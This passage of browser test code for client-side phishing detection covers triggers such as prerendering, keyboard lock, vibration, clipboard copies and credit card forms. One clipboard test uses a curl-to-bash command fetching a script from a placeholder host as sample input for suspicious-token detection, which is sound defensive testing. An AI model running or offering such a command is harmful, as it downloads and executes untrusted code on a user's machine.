    ASSERT_TRUE(ui_test_utils::NavigateToURL(browser(), initial_url));
    paint_waiter.Wait();
  } else {
    ASSERT_TRUE(ui_test_utils::NavigateToURL(browser(), initial_url));
  }

  // Prerender then activate a phishing page.
  const GURL prerender_url =
      embedded_test_server()->GetURL("/safe_browsing/malware.html");
  prerender_helper().AddPrerender(prerender_url);
  if (base::FeatureList::IsEnabled(kClientSideDetectionNewObservers)) {
    PaintObserverWaiter paint_waiter(GetWebContents());
    prerender_helper().NavigatePrimaryPage(prerender_url);
    paint_waiter.Wait();
  } else {
    prerender_helper().NavigatePrimaryPage(prerender_url);
  }

  feature_cache_map->Clear();

  // Bypass the pre-classification checks.
  csd_host->OnPhishingPreClassificationDone(
      ClientSideDetectionType::TRIGGER_MODELS, /*should_classify=*/true,
      /*is_sample_ping=*/false, /*did_match_high_confidence_allowlist=*/false,
      /*is_invalid_ip=*/false);

  run_loop.Run();

  ASSERT_FALSE(fake_csd_service.saved_callback_is_null());

  // Expect an interstitial to be shown.
  EXPECT_CALL(*mock_ui_manager, DisplayBlockingPage(_));
  std::move(fake_csd_service.saved_callback())
      .Run(prerender_url, true, net::HTTP_OK, std::nullopt);

  LoginReputationClientRequest::DebuggingMetadata* debugging_metadata =
      feature_cache_map->GetOrCreateDebuggingMetadataForURL(prerender_url);

  // The value remains private ip since we bypassed it in the test, but we
  // cleared the cache before bypassing, so this should not equal anymore.
  EXPECT_NE(debugging_metadata->preclassification_check_result(),
            PreClassificationCheckResult::NO_CLASSIFY_PRIVATE_IP);
  EXPECT_EQ(debugging_metadata->network_result(), net::HTTP_OK);
  EXPECT_EQ(debugging_metadata->phishing_detector_result(),
            PhishingDetectorResult::CLASSIFICATION_SUCCESS);
  EXPECT_TRUE(debugging_metadata->local_model_detects_phishing());
}

IN_PROC_BROWSER_TEST_F(
    ClientSideDetectionHostPrerenderExclusiveAccessBrowserTest,
    KeyboardLockTriggersPreclassificationCheck) {
  if (base::FeatureList::IsEnabled(kClientSideDetectionKillswitch)) {
    GTEST_SKIP();
  }

  SetSafeBrowsingState(browser()->profile()->GetPrefs(),
                       SafeBrowsingState::ENHANCED_PROTECTION);

  base::HistogramTester histogram_tester;

  FakeClientSideDetectionService fake_csd_service;
  fake_csd_service.SetModel(client_side_model());

  scoped_refptr<StrictMock<MockSafeBrowsingUIManager>> mock_ui_manager =
      new StrictMock<MockSafeBrowsingUIManager>();

  std::unique_ptr<ClientSideDetectionHost> csd_host =
      ChromeClientSideDetectionHostDelegate::CreateHost(
          browser()->tab_strip_model()->GetActiveWebContents());
  csd_host->set_client_side_detection_service(fake_csd_service.GetWeakPtr());
  csd_host->set_ui_manager(mock_ui_manager.get());
  fake_csd_service.SendModelToRenderers();

  const GURL initial_url(embedded_test_server()->GetURL("/title1.html"));
  if (base::FeatureList::IsEnabled(kClientSideDetectionNewObservers)) {
    PaintObserverWaiter paint_waiter(GetWebContents());
    ASSERT_TRUE(ui_test_utils::NavigateToURL(browser(), initial_url));
    prerender_helper().AddPrerender(initial_url);
    prerender_helper().NavigatePrimaryPage(initial_url);
    paint_waiter.Wait();
  } else {
    ASSERT_TRUE(ui_test_utils::NavigateToURL(browser(), initial_url));
  }

  EnterActiveTabFullscreen();
  ASSERT_TRUE(RequestKeyboardLock(/*esc_key_locked=*/true));
  ASSERT_TRUE(GetExclusiveAccessManager()
                  ->keyboard_lock_controller()
                  ->IsKeyboardLockActive());

  // TODO(andysjlim): Preclassification check should trigger one additional
  // times with the keyboard lock notify, but this is added twice. Investigate
  // why.
  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.PreClassificationCheckResult.KeyboardLockRequested", 2);
}

IN_PROC_BROWSER_TEST_F(
    ClientSideDetectionHostPrerenderExclusiveAccessBrowserTest,
    KeyboardLockClassificationTriggersCSPPPing) {
  if (base::FeatureList::IsEnabled(kClientSideDetectionKillswitch)) {
    GTEST_SKIP();
  }

  SetSafeBrowsingState(browser()->profile()->GetPrefs(),
                       SafeBrowsingState::ENHANCED_PROTECTION);

  base::HistogramTester histogram_tester;

  FakeClientSideDetectionService fake_csd_service;
  fake_csd_service.SetModel(client_side_model());

  scoped_refptr<StrictMock<MockSafeBrowsingUIManager>> mock_ui_manager =
      new StrictMock<MockSafeBrowsingUIManager>();

  std::unique_ptr<ClientSideDetectionHost> csd_host =
      ChromeClientSideDetectionHostDelegate::CreateHost(
          browser()->tab_strip_model()->GetActiveWebContents());
  csd_host->set_client_side_detection_service(fake_csd_service.GetWeakPtr());
  csd_host->set_ui_manager(mock_ui_manager.get());
  fake_csd_service.SendModelToRenderers();

  base::RunLoop run_loop;
  fake_csd_service.SetRequestCallback(run_loop.QuitClosure());

  const GURL initial_url(embedded_test_server()->GetURL("/title1.html"));
  if (base::FeatureList::IsEnabled(kClientSideDetectionNewObservers)) {
    PaintObserverWaiter paint_waiter(GetWebContents());
    ASSERT_TRUE(ui_test_utils::NavigateToURL(browser(), initial_url));
    paint_waiter.Wait();
  } else {
    ASSERT_TRUE(ui_test_utils::NavigateToURL(browser(), initial_url));
  }

  prerender_helper().AddPrerender(initial_url);
  if (base::FeatureList::IsEnabled(kClientSideDetectionNewObservers)) {
    PaintObserverWaiter paint_waiter(GetWebContents());
    prerender_helper().NavigatePrimaryPage(initial_url);
    paint_waiter.Wait();
  } else {
    prerender_helper().NavigatePrimaryPage(initial_url);
  }

  EnterActiveTabFullscreen();
  ASSERT_TRUE(RequestKeyboardLock(/*esc_key_locked=*/true));
  ASSERT_TRUE(GetExclusiveAccessManager()
                  ->keyboard_lock_controller()
                  ->IsKeyboardLockActive());

  // Bypass the pre-classification check because it would otherwise return
  // "NO_CLASSIFY_PRIVATE_IP".
  csd_host->OnPhishingPreClassificationDone(
      ClientSideDetectionType::KEYBOARD_LOCK_REQUESTED,
      /*should_classify=*/true, /*is_sample_ping=*/false,
      /*did_match_high_confidence_allowlist=*/false,
      /*is_invalid_ip=*/false);

  run_loop.Run();

  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.PhishingDetectorResult.KeyboardLockRequested", 1);
  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.ClientSideDetectionTypeRequest", 1);

  ASSERT_FALSE(fake_csd_service.saved_callback_is_null());

  // Expect an interstitial to be shown.
  EXPECT_CALL(*mock_ui_manager, DisplayBlockingPage(_));
  std::move(fake_csd_service.saved_callback())
      .Run(initial_url, true, net::HTTP_OK, std::nullopt);

  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.ServerModelDetectsPhishing.KeyboardLockRequested", 1);

  // We do not check whether the keyboard lock is active because the
  // MockSafeBrowsingUIManager does not do any navigation on the page, but a red
  // warning page navigation will change the state of WebContents, which
  // ultimately removes the fullscreen and thus the lock.
}

class ClientSideDetectionHostVibrateTest : public InProcessBrowserTest {
 public:
  ClientSideDetectionHostVibrateTest() {
    prerender_helper_ = std::make_unique<content::test::PrerenderTestHelper>(
        base::BindRepeating(&ClientSideDetectionHostVibrateTest::GetWebContents,
                            base::Unretained(this)));
  }

  ClientSideDetectionHostVibrateTest(
      const ClientSideDetectionHostVibrateTest&) = delete;
  ClientSideDetectionHostVibrateTest& operator=(
      const ClientSideDetectionHostVibrateTest&) = delete;
  ~ClientSideDetectionHostVibrateTest() override = default;

  void SetUpOnMainThread() override {
    flatbuffer_model_str_ = set_up_client_side_model();
    host_resolver()->AddRule("*", "127.0.0.1");
    ASSERT_TRUE(embedded_test_server()->Start());
  }

  std::string client_side_model() { return flatbuffer_model_str_; }

  content::test::PrerenderTestHelper& prerender_helper() {
    return *prerender_helper_.get();
  }

  content::WebContents* GetWebContents() {
    return browser()->tab_strip_model()->GetActiveWebContents();
  }

 protected:
  void TriggerVibrate(int duration, base::OnceClosure vibrate_done) {
    content::RenderFrameHost* frame = GetWebContents()->GetPrimaryMainFrame();
    std::string script =
        "navigator.vibrate(" + base::NumberToString(duration) + ")";
    EXPECT_TRUE(ExecJs(frame, script));
    std::move(vibrate_done).Run();
  }

 private:
  std::unique_ptr<content::test::PrerenderTestHelper> prerender_helper_;
  std::string flatbuffer_model_str_;
};

class VibrationObserverWaiter : public content::WebContentsObserver {
 public:
  explicit VibrationObserverWaiter(content::WebContents* web_contents)
      : WebContentsObserver(web_contents) {}

  void VibrationRequested() override {
    did_vibrate_ = true;
    run_loop_.Quit();
  }

  void Wait() {
    if (!did_vibrate_) {
      run_loop_.Run();
    }
  }

  bool DidVibrate() { return did_vibrate_; }

 private:
  bool did_vibrate_ = false;
  base::RunLoop run_loop_;
};

IN_PROC_BROWSER_TEST_F(ClientSideDetectionHostVibrateTest,
                       VibrationApiTriggersPreclassificationCheck) {
  if (base::FeatureList::IsEnabled(kClientSideDetectionKillswitch)) {
    GTEST_SKIP();
  }
  SetSafeBrowsingState(browser()->profile()->GetPrefs(),
                       SafeBrowsingState::ENHANCED_PROTECTION);

  base::HistogramTester histogram_tester;

  FakeClientSideDetectionService fake_csd_service;
  fake_csd_service.SetModel(client_side_model());

  scoped_refptr<StrictMock<MockSafeBrowsingUIManager>> mock_ui_manager =
      new StrictMock<MockSafeBrowsingUIManager>();

  std::unique_ptr<ClientSideDetectionHost> csd_host =
      ChromeClientSideDetectionHostDelegate::CreateHost(
          browser()->tab_strip_model()->GetActiveWebContents());
  csd_host->set_client_side_detection_service(fake_csd_service.GetWeakPtr());
  csd_host->set_ui_manager(mock_ui_manager.get());
  fake_csd_service.SendModelToRenderers();

  const GURL initial_url(embedded_test_server()->GetURL("/title1.html"));
  if (base::FeatureList::IsEnabled(kClientSideDetectionNewObservers)) {
    PaintObserverWaiter paint_waiter(GetWebContents());
    ASSERT_TRUE(ui_test_utils::NavigateToURL(browser(), initial_url));
    prerender_helper().AddPrerender(initial_url);
    prerender_helper().NavigatePrimaryPage(initial_url);
    paint_waiter.Wait();
  } else {
    ASSERT_TRUE(ui_test_utils::NavigateToURL(browser(), initial_url));
  }

  VibrationObserverWaiter waiter(GetWebContents());
  EXPECT_FALSE(waiter.DidVibrate());

  base::RunLoop run_loop;
  TriggerVibrate(1234, run_loop.QuitClosure());
  run_loop.Run();
  waiter.Wait();

  // TODO(andysjlim): Just like above, VibrationRequested() in the host class is
  // hit twice, although the web contents observer notification is hit once, so
  // the second immediately cancels the first. Observe why this happens.
  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.PreClassificationCheckResult.VibrationApi", 2);
  EXPECT_TRUE(waiter.DidVibrate());

  // Triggering vibration again on the same page will not trigger
  // PreClassification.
  base::RunLoop second_vibrate_run_loop;
  TriggerVibrate(1234, second_vibrate_run_loop.QuitClosure());
  second_vibrate_run_loop.Run();
  waiter.Wait();

  // The total count has not changed although the second_vibration_run_loop has
  // triggered another vibration.
  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.PreClassificationCheckResult.VibrationApi", 2);
}

IN_PROC_BROWSER_TEST_F(ClientSideDetectionHostVibrateTest,
                       VibrationApiClassificationTriggersCSPPPing) {
  if (base::FeatureList::IsEnabled(kClientSideDetectionKillswitch)) {
    GTEST_SKIP();
  }
  SetSafeBrowsingState(browser()->profile()->GetPrefs(),
                       SafeBrowsingState::ENHANCED_PROTECTION);

  base::HistogramTester histogram_tester;

  FakeClientSideDetectionService fake_csd_service;
  fake_csd_service.SetModel(client_side_model());

  scoped_refptr<StrictMock<MockSafeBrowsingUIManager>> mock_ui_manager =
      new StrictMock<MockSafeBrowsingUIManager>();

  std::unique_ptr<ClientSideDetectionHost> csd_host =
      ChromeClientSideDetectionHostDelegate::CreateHost(
          browser()->tab_strip_model()->GetActiveWebContents());
  csd_host->set_client_side_detection_service(fake_csd_service.GetWeakPtr());
  csd_host->set_ui_manager(mock_ui_manager.get());
  fake_csd_service.SendModelToRenderers();

  base::RunLoop run_loop;
  fake_csd_service.SetRequestCallback(run_loop.QuitClosure());

  const GURL initial_url(embedded_test_server()->GetURL("/title1.html"));
  if (base::FeatureList::IsEnabled(kClientSideDetectionNewObservers)) {
    PaintObserverWaiter paint_waiter(GetWebContents());
    ASSERT_TRUE(ui_test_utils::NavigateToURL(browser(), initial_url));
    paint_waiter.Wait();
  } else {
    ASSERT_TRUE(ui_test_utils::NavigateToURL(browser(), initial_url));
  }

  // Bypass the pre-classification check because it would otherwise return
  // "NO_CLASSIFY_PRIVATE_IP".
  csd_host->OnPhishingPreClassificationDone(
      ClientSideDetectionType::VIBRATION_API,
      /*should_classify=*/true, /*is_sample_ping=*/false,
      /*did_match_high_confidence_allowlist=*/false,
      /*is_invalid_ip=*/false);
  run_loop.Run();

  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.PhishingDetectorResult.VibrationApi", 1);
  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.ClientSideDetectionTypeRequest", 1);

  ASSERT_FALSE(fake_csd_service.saved_callback_is_null());

  // Expect an interstitial to be shown.
  EXPECT_CALL(*mock_ui_manager, DisplayBlockingPage(_));
  std::move(fake_csd_service.saved_callback())
      .Run(initial_url, true, net::HTTP_OK, std::nullopt);

  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.ServerModelDetectsPhishing.VibrationApi", 1);
}

class ClientSideDetectionHostClipboardTest
    : public InProcessBrowserTest,
      public testing::WithParamInterface<std::tuple<std::string_view, bool>> {
 public:
  ClientSideDetectionHostClipboardTest() {
    scoped_feature_list_.InitAndEnableFeatureWithParameters(
        kClientSideDetectionClipboardCopyApi,
        {{kCsdClipboardCopyApiHCAcceptanceRate.name, "0.0"},
         {kCsdClipboardCopyApiSampleRate.name, "1.0"},
         {kCsdClipboardCopyApiMinLength.name, "30"},
         {kCsdClipboardCopyApiMaxLength.name, "50"},
         {kCSDClipboardCopyApiProcessPayload.name,
          ShouldProcessClipboardPayload() ? "true" : "false"}});
  }

  ClientSideDetectionHostClipboardTest(
      const ClientSideDetectionHostClipboardTest&) = delete;
  ClientSideDetectionHostClipboardTest& operator=(
      const ClientSideDetectionHostClipboardTest&) = delete;
  ~ClientSideDetectionHostClipboardTest() override = default;

  void SetUpOnMainThread() override {
    flatbuffer_model_str_ = set_up_client_side_model();
    host_resolver()->AddRule("*", "127.0.0.1");
    ASSERT_TRUE(embedded_test_server()->Start());
  }

  std::string client_side_model() { return flatbuffer_model_str_; }

  content::WebContents* GetWebContents() {
    return browser()->tab_strip_model()->GetActiveWebContents();
  }

  // This script uses the Clipboard API to write text to the clipboard.
  static constexpr char kClipboardApiScriptTemplate[] =
      "navigator.clipboard.writeText($1)";
  // This script uses the (deprecated) `execCommand` method to write the
  // currently-selected text to the clipboard. As a result, the script creates a
  // temporary DOM element and selects text from that element.
  static constexpr char kDocumentExecScriptTemplate[] = R"(
    (function() {
      const textSelectionArea = document.createElement("textarea");
      textSelectionArea.value = $1;
      document.body.append(textSelectionArea);
      textSelectionArea.select();
      document.execCommand("copy");
      document.body.removeChild(textSelectionArea);
    })();
  )";

 protected:
  void TriggerClipboardCopy(std::string_view copied_text,
                            base::OnceClosure clipboard_copy_done) {
    content::RenderFrameHost* frame = GetWebContents()->GetPrimaryMainFrame();
    frame->GetView()->Focus();
    std::string script =
        content::JsReplace(GetClipboardCopyScript(), copied_text);
    ASSERT_TRUE(ExecJs(frame, script));
    std::move(clipboard_copy_done).Run();
  }

  bool ShouldProcessClipboardPayload() { return testing::get<1>(GetParam()); }

  base::test::ScopedFeatureList scoped_feature_list_;

 private:
  std::string_view GetClipboardCopyScript() {
    return testing::get<0>(GetParam());
  }

  std::string flatbuffer_model_str_;
};

INSTANTIATE_TEST_SUITE_P(
    All,
    ClientSideDetectionHostClipboardTest,
    ::testing::Combine(
        ::testing::Values(
            ClientSideDetectionHostClipboardTest::kClipboardApiScriptTemplate,
            ClientSideDetectionHostClipboardTest::kDocumentExecScriptTemplate),
        testing::Bool()));

class ClipboardObserverWaiter : public content::WebContentsObserver {
 public:
  explicit ClipboardObserverWaiter(content::WebContents* web_contents)
      : WebContentsObserver(web_contents) {}

  void OnTextCopiedToClipboard(content::RenderFrameHost* render_frame_host,
                               const std::u16string& copied_text) override {
    did_copy_to_clipboard_ = true;
    run_loop_.Quit();
  }

  void Wait() {
    if (!did_copy_to_clipboard_) {
      run_loop_.Run();
    }
  }

  bool DidCopyToClipboard() { return did_copy_to_clipboard_; }

 private:
  bool did_copy_to_clipboard_ = false;
  base::RunLoop run_loop_;
};

IN_PROC_BROWSER_TEST_P(ClientSideDetectionHostClipboardTest,
                       ClipboardApiTriggersPreclassificationCheck) {
  if (base::FeatureList::IsEnabled(kClientSideDetectionKillswitch)) {
    GTEST_SKIP();
  }
  SetSafeBrowsingState(browser()->profile()->GetPrefs(),
                       SafeBrowsingState::ENHANCED_PROTECTION);

  base::HistogramTester histogram_tester;

  FakeClientSideDetectionService fake_csd_service;
  fake_csd_service.SetModel(client_side_model());

  scoped_refptr<StrictMock<MockSafeBrowsingUIManager>> mock_ui_manager =
      new StrictMock<MockSafeBrowsingUIManager>();

  std::unique_ptr<ClientSideDetectionHost> csd_host =
      ChromeClientSideDetectionHostDelegate::CreateHost(
          browser()->tab_strip_model()->GetActiveWebContents());
  csd_host->set_client_side_detection_service(fake_csd_service.GetWeakPtr());
  csd_host->set_ui_manager(mock_ui_manager.get());
  fake_csd_service.SendModelToRenderers();

  const GURL initial_url(embedded_test_server()->GetURL("/title1.html"));
  if (base::FeatureList::IsEnabled(kClientSideDetectionNewObservers)) {
    PaintObserverWaiter paint_waiter(GetWebContents());
    ASSERT_TRUE(ui_test_utils::NavigateToURL(browser(), initial_url));
    paint_waiter.Wait();
  } else {
    ASSERT_TRUE(ui_test_utils::NavigateToURL(browser(), initial_url));
  }

  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.PreClassificationCheckResult.ClipboardCopyApi", 0);

  ClipboardObserverWaiter waiter(GetWebContents());
  ASSERT_FALSE(waiter.DidCopyToClipboard());

  base::RunLoop run_loop;
  TriggerClipboardCopy("this will be copied to the clipboard",
                       run_loop.QuitClosure());
  run_loop.Run();
  waiter.Wait();

  EXPECT_TRUE(waiter.DidCopyToClipboard());
  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.ClipboardCopyApi.PayloadLength", 2);
  histogram_tester.ExpectUniqueSample(
      "SBClientPhishing.ClipboardCopyApi.PayloadLength", 36, 2);
  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.PreClassificationCheckResult.ClipboardCopyApi", 2);
}

IN_PROC_BROWSER_TEST_P(ClientSideDetectionHostClipboardTest,
                       ClipboardApiClassificationTriggersCSPPPing) {
  if (base::FeatureList::IsEnabled(kClientSideDetectionKillswitch)) {
    GTEST_SKIP();
  }
  SetSafeBrowsingState(browser()->profile()->GetPrefs(),
                       SafeBrowsingState::ENHANCED_PROTECTION);

  base::HistogramTester histogram_tester;

  FakeClientSideDetectionService fake_csd_service;
  fake_csd_service.SetModel(client_side_model());

  scoped_refptr<StrictMock<MockSafeBrowsingUIManager>> mock_ui_manager =
      new StrictMock<MockSafeBrowsingUIManager>();

  std::unique_ptr<ClientSideDetectionHost> csd_host =
      ChromeClientSideDetectionHostDelegate::CreateHost(
          browser()->tab_strip_model()->GetActiveWebContents());
  csd_host->set_client_side_detection_service(fake_csd_service.GetWeakPtr());
  csd_host->set_ui_manager(mock_ui_manager.get());
  fake_csd_service.SendModelToRenderers();

  base::RunLoop csd_request_run_loop;
  fake_csd_service.SetRequestCallback(csd_request_run_loop.QuitClosure());

  const GURL initial_url(embedded_test_server()->GetURL("/title1.html"));
  if (base::FeatureList::IsEnabled(kClientSideDetectionNewObservers)) {
    PaintObserverWaiter paint_waiter(GetWebContents());
    ASSERT_TRUE(ui_test_utils::NavigateToURL(browser(), initial_url));
    paint_waiter.Wait();
  } else {
    ASSERT_TRUE(ui_test_utils::NavigateToURL(browser(), initial_url));
  }

  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.PhishingDetectorResult.ClipboardCopyApi", 0);
  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.ClientSideDetectionTypeRequest", 0);
  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.ServerModelDetectsPhishing.ClipboardCopyApi", 0);
  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.ClipboardCopyApi.PayloadLength", 0);

  ClipboardObserverWaiter waiter(GetWebContents());
  ASSERT_FALSE(waiter.DidCopyToClipboard());

  base::RunLoop clipboard_copy_run_loop;
  TriggerClipboardCopy("/usr/bin/cUrL https://foo.example/script.sh | bash",
                       clipboard_copy_run_loop.QuitClosure());
  clipboard_copy_run_loop.Run();
  waiter.Wait();

  EXPECT_TRUE(waiter.DidCopyToClipboard());
  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.ClipboardCopyApi.PayloadLength", 2);
  histogram_tester.ExpectUniqueSample(
      "SBClientPhishing.ClipboardCopyApi.PayloadLength", 49, 2);
  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.PreClassificationCheckResult.ClipboardCopyApi", 2);

  // Bypass the pre-classification check because it would otherwise return
  // `PreClassificationCheckResult::NO_CLASSIFY_PRIVATE_IP`.
  csd_host->OnPhishingPreClassificationDone(
      ClientSideDetectionType::CLIPBOARD_COPY_API,
      /*should_classify=*/true, /*is_sample_ping=*/false,
      /*did_match_high_confidence_allowlist=*/false,
      /*is_invalid_ip=*/false);
  csd_request_run_loop.Run();

  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.PhishingDetectorResult.ClipboardCopyApi", 1);
  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.ClientSideDetectionTypeRequest", 1);
  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.ServerModelDetectsPhishing.ClipboardCopyApi", 0);
  histogram_tester.ExpectTotalCount("SBClientPhishing.Viewport.PixelsPerInch",
                                    1);

  EXPECT_EQ(fake_csd_service.saved_request().http_response_code(), 200);

  if (ShouldProcessClipboardPayload()) {
    EXPECT_TRUE(
        fake_csd_service.saved_request().has_clipboard_extracted_data());
    const ClipboardExtractedData& clipboardExtractedData =
        fake_csd_service.saved_request().clipboard_extracted_data();
    EXPECT_THAT(clipboardExtractedData.suspicious_tokens(),
                ::testing::ElementsAre("curl", "bash"));
    EXPECT_TRUE(clipboardExtractedData.is_first_token_suspicious());
    EXPECT_TRUE(clipboardExtractedData.is_last_token_suspicious());
    histogram_tester.ExpectTotalCount(
        "SBClientPhishing.ClipboardCopyApi.PayloadExtraction.TokenCount", 1);
    histogram_tester.ExpectUniqueSample(
        "SBClientPhishing.ClipboardCopyApi.PayloadExtraction.TokenCount", 3, 1);
    histogram_tester.ExpectUniqueSample(
        "SBClientPhishing.ClipboardCopyApi.PayloadExtraction."
        "SuspiciousTokenCount",
        2, 1);
    histogram_tester.ExpectTotalCount(
        "SBClientPhishing.ClipboardCopyApi.PayloadExtraction."
        "SuspiciousTokenCount",
        1);
  } else {
    EXPECT_FALSE(
        fake_csd_service.saved_request().has_clipboard_extracted_data());
    histogram_tester.ExpectTotalCount(
        "SBClientPhishing.ClipboardCopyApi.PayloadExtraction.TokenCount", 0);
    histogram_tester.ExpectTotalCount(
        "SBClientPhishing.ClipboardCopyApi.PayloadExtraction."
        "SuspiciousTokenCount",
        0);
  }

  // Expect an interstitial to be shown.
  EXPECT_CALL(*mock_ui_manager, DisplayBlockingPage(_));

  ASSERT_FALSE(fake_csd_service.saved_callback_is_null());
  std::move(fake_csd_service.saved_callback())
      .Run(initial_url, true, net::HTTP_OK, std::nullopt);

  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.PhishingDetectorResult.ClipboardCopyApi", 1);
  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.ClientSideDetectionTypeRequest", 1);
  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.ServerModelDetectsPhishing.ClipboardCopyApi", 1);
  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.ClipboardCopyApi.PayloadLength", 2);
}

IN_PROC_BROWSER_TEST_P(
    ClientSideDetectionHostClipboardTest,
    ClipboardApiDoesNotTriggerPreclassificationCheckWithShortPayload) {
  if (base::FeatureList::IsEnabled(kClientSideDetectionKillswitch)) {
    GTEST_SKIP();
  }
  SetSafeBrowsingState(browser()->profile()->GetPrefs(),
                       SafeBrowsingState::ENHANCED_PROTECTION);

  base::HistogramTester histogram_tester;

  const GURL initial_url(embedded_test_server()->GetURL("/title1.html"));
  if (base::FeatureList::IsEnabled(kClientSideDetectionNewObservers)) {
    PaintObserverWaiter paint_waiter(GetWebContents());
    ASSERT_TRUE(ui_test_utils::NavigateToURL(browser(), initial_url));
    paint_waiter.Wait();
  } else {
    ASSERT_TRUE(ui_test_utils::NavigateToURL(browser(), initial_url));
  }

  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.PreClassificationCheckResult.ClipboardCopyApi", 0);

  ClipboardObserverWaiter waiter(GetWebContents());
  ASSERT_FALSE(waiter.DidCopyToClipboard());

  base::RunLoop run_loop;
  TriggerClipboardCopy("this payload is too short", run_loop.QuitClosure());
  run_loop.Run();
  waiter.Wait();

  EXPECT_TRUE(waiter.DidCopyToClipboard());
  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.ClipboardCopyApi.PayloadLength", 1);
  histogram_tester.ExpectUniqueSample(
      "SBClientPhishing.ClipboardCopyApi.PayloadLength", 25, 1);
  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.PreClassificationCheckResult.ClipboardCopyApi", 0);
}

IN_PROC_BROWSER_TEST_P(
    ClientSideDetectionHostClipboardTest,
    ClipboardApiDoesNotTriggerPreclassificationCheckWithLongPayload) {
  if (base::FeatureList::IsEnabled(kClientSideDetectionKillswitch)) {
    GTEST_SKIP();
  }
  SetSafeBrowsingState(browser()->profile()->GetPrefs(),
                       SafeBrowsingState::ENHANCED_PROTECTION);

  base::HistogramTester histogram_tester;

  const GURL initial_url(embedded_test_server()->GetURL("/title1.html"));
  if (base::FeatureList::IsEnabled(kClientSideDetectionNewObservers)) {
    PaintObserverWaiter paint_waiter(GetWebContents());
    ASSERT_TRUE(ui_test_utils::NavigateToURL(browser(), initial_url));
    paint_waiter.Wait();
  } else {
    ASSERT_TRUE(ui_test_utils::NavigateToURL(browser(), initial_url));
  }

  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.PreClassificationCheckResult.ClipboardCopyApi", 0);

  ClipboardObserverWaiter waiter(GetWebContents());
  ASSERT_FALSE(waiter.DidCopyToClipboard());

  base::RunLoop run_loop;
  TriggerClipboardCopy(
      "this is a very long payload and will be filtered out because it is "
      "longer than 50 characters",
      run_loop.QuitClosure());
  run_loop.Run();
  waiter.Wait();

  EXPECT_TRUE(waiter.DidCopyToClipboard());
  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.ClipboardCopyApi.PayloadLength", 1);
  histogram_tester.ExpectUniqueSample(
      "SBClientPhishing.ClipboardCopyApi.PayloadLength", 92, 1);
  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.PreClassificationCheckResult.ClipboardCopyApi", 0);
}

class ClientSideDetectionHostCreditCardFormTest : public InProcessBrowserTest {
 public:
  ClientSideDetectionHostCreditCardFormTest() {
    scoped_feature_list_.InitAndEnableFeatureWithParameters(
        kClientSideDetectionCreditCardForm,
        {
            {kCsdCreditCardFormHCAcceptanceRate.name, "0.0"},
            {kCsdCreditCardFormSampleRate.name, "1.0"},
            {kCsdCreditCardFormEnableInteractionTrigger.name, "true"},
        });
  }

  ClientSideDetectionHostCreditCardFormTest(
      const ClientSideDetectionHostCreditCardFormTest&) = delete;
  ClientSideDetectionHostCreditCardFormTest& operator=(
      const ClientSideDetectionHostCreditCardFormTest&) = delete;
  ~ClientSideDetectionHostCreditCardFormTest() override = default;

  void SetUpOnMainThread() override {
    flatbuffer_model_str_ = set_up_client_side_model();
    host_resolver()->AddRule("*", "127.0.0.1");
    ASSERT_TRUE(embedded_test_server()->Start());
  }

  std::string client_side_model() { return flatbuffer_model_str_; }

  content::WebContents* GetWebContents() {
    return browser()->tab_strip_model()->GetActiveWebContents();
  }

 protected:
  base::test::ScopedFeatureList scoped_feature_list_;

  autofill::AutofillManager* autofill_manager() {
    autofill::ContentAutofillDriver* driver =
        autofill::ContentAutofillDriver::GetForRenderFrameHost(
            GetWebContents()->GetPrimaryMainFrame());
    return &driver->GetAutofillManager();
  }

  GURL NavigateToCreditCardForm() {
    const GURL url(embedded_test_server()->GetURL(
        "/autofill/autofill_creditcard_form.html"));
    if (base::FeatureList::IsEnabled(kClientSideDetectionNewObservers)) {
      PaintObserverWaiter paint_waiter(GetWebContents());
      EXPECT_TRUE(ui_test_utils::NavigateToURL(browser(), url));
      paint_waiter.Wait();
    } else {
      EXPECT_TRUE(ui_test_utils::NavigateToURL(browser(), url));
    }
    return url;
  }

  void FocusOnCreditCardNumberField() {
    std::string script =
        "document.getElementById('CREDIT_CARD_NUMBER').focus();";
    content::RenderFrameHost* frame = GetWebContents()->GetPrimaryMainFrame();
    frame->GetView()->Focus();
    ASSERT_TRUE(ExecJs(frame, script));
  }

 private:
  std::string flatbuffer_model_str_;
};

class ClientSideDetectionHostCreditCardFormTriggerDisabledTest
    : public ClientSideDetectionHostCreditCardFormTest {
 public:
  ClientSideDetectionHostCreditCardFormTriggerDisabledTest() {
    scoped_feature_list_.Reset();
    scoped_feature_list_.InitAndEnableFeatureWithParameters(
        kClientSideDetectionCreditCardForm,
        {
            {kCsdCreditCardFormSampleRate.name, "1.0"},
            {kCsdCreditCardFormEnableInteractionTrigger.name, "false"},
            {kCsdCreditCardFormEnableDetectionTrigger.name, "false"},
        });
  }
};

class ClientSideDetectionHostCreditCardFormDetectionOnlyTest
    : public ClientSideDetectionHostCreditCardFormTest {
 public:
  ClientSideDetectionHostCreditCardFormDetectionOnlyTest() {
    scoped_feature_list_.Reset();
    scoped_feature_list_.InitAndEnableFeatureWithParameters(
